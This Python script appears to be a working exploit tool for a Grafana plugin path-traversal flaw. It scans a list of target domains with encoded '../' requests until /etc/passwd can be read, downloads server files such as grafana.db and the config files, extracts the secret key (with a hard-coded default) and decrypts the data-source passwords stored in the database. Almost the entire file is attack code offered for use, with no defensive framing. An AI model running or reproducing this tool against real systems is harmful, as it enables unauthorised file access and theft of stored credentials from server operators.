import os
import re
import json
import requests
import urllib3
import sqlite3
import base64

from PyInquirer import prompt
from termcolor import colored

from utils import LOGO
from secure import decrypt

# Disable SSL warnings
urllib3.disable_warnings()

HEADERS = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
}

if __name__ == "__main__":
    # Show logo
    print(colored(LOGO, 'red'))

    # Prompt the questions
    questions = prompt([
        {
            'type': 'input',
            'name': 'target_list',
            'message': 'Enter the target list:',
        }
    ])

    # Open domain list file
    try: domains = open(questions['target_list'], 'r', encoding='utf-8').readlines()
    except: raise Exception('[!] Domains file not exists.')

    # Open paths and payload list file
    payloads = open('payload.txt', 'r', encoding='utf-8').readlines()
    paths = open('paths.txt', 'r', encoding='utf-8').readlines()

    for domain in domains:
        vuln_payload = None

        domain = domain.strip()
        out_path = re.sub(r"[^0-9a-zA-Z]+", "_", domain)
        domain = domain if re.search(r"^https?:\/\/", domain) else "http://" + domain

        print(f'\n{"=" * 40}\n')

        print(colored(f"[i] Target: {domain}\n", "blue"))

        for payload in payloads:
            url = f"{domain}/public/plugins/{payload.strip()}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"

            req = requests.get(url, headers=HEADERS, timeout=(3, 10), allow_redirects=False, verify=False)

            if req.status_code == 200:
                print(colored(f"[!] Payload \"{url.strip()}\" works.\n", "green"))
                vuln_payload = payload.strip() # Set as vulnerable
                break # Stop payload tests
            else:
                print(colored(f"[!] Payload \"{url.strip()}\" not works.\n", "red"))

        if vuln_payload is not None:
            print(colored(f"[i] Analysing files...\n", "blue"))

            found = {}

            for path in paths:
                path = path.strip()

                url = f"{domain}/public/plugins/{vuln_payload}{path}"

                req = requests.get(url, headers=HEADERS, timeout=(3, 10), allow_redirects=False, verify=False)

                if req.status_code == 200:
                    print(colored(f"[i] File \"/{path.split('%2f')[-1]}\" found in server.", "yellow"))

                    out_file = os.path.join('.', out_path, path.split('/')[-1])

                    found[(path.split('/')[-1])] = out_file

                    if not os.path.isdir(f'./{out_path}'):
                        os.mkdir(f'./{out_path}')

                    with open(out_file, 'wb+') as fd:
                        fd.write(req.content)

                    print(colored(f"[*] File saved in \"{out_file}\".\n", "green"))

            if "grafana.db" in found.keys():
                eq = prompt([
                    {
                        'type': 'confirm',
                        'name': 'extract',
                        'message': 'Do you want to try to extract the passwords from the data source?',
                    }
                ])

                if eq['extract']:
                    # Default secret key
                    secret_key = "SW2YcwTIb9zpOOhoPsMm"

                    if "defaults.ini" in found.keys():
                        extracted_file = open(found["defaults.ini"], 'r').read()
                        extract_secret = re.search(r"^secret_key = (.*)$", extracted_file, flags=re.M)

                        if extract_secret:
                            secret_key = extract_secret.group(1)

                    if "grafana.ini" in found.keys():
                        extracted_file = open(found["defaults.ini"], 'r').read()
                        extract_secret = re.search(r"^secret_key = (.*)$", extracted_file, flags=re.M)

                        if extract_secret:
                            secret_key = extract_secret.group(1)

                    print(colored(f"\n[i] Secret Key: {secret_key}\n", "yellow"))

                    try: 
                        conn = sqlite3.connect(found["grafana.db"])
                    except:
                        print(colored(f"[!] Database corrupted or encrypted.", "red"))
                        exit(0)

                    cursor = conn.cursor()
                    items = [
                        json.loads(v[0]) for v in 
                        cursor.execute("SELECT secure_json_data FROM data_source").fetchall()
                    ]

                    for item in items:
                        if "password" in item:
                            ciphertext = item['password']
                            print(colored(f"[*] Decrypting password: {ciphertext}", "blue"))

                            encrypted = base64.b64decode(ciphertext.encode())
                            try:
                                pwdBytes, _ = decrypt(encrypted, secret_key)
                            except:
                                pwdBytes = None

                            if pwdBytes is None:
                                print(colored(f"[!] Unable to decrypt password..\n", "red"))
                            else:
                                print(colored(f"[*] Decrypted password: {pwdBytes}\n", "green"))
                                
        print(colored(f"[*] Bye Bye!", "red"))



                    






                        